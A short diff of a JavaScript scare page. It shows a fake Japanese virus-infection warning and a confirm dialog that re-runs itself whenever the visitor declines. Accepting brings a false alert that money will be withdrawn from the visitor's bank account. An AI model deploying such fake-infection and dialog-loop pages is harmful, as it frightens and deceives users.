@@ -5,7 +5,7 @@ let message = "あなたの端末はウィルスに感染しました。\nΝαό
 
 const kure = () => {
     if (confirm(message)) {
-        alert("電話番号から銀行口座を参照し、\n引き落としを開始します。");
+        alert("電話番号から銀行口座を参照し、\n引き落としを開始します。","");
     } else {
         kure();
     }
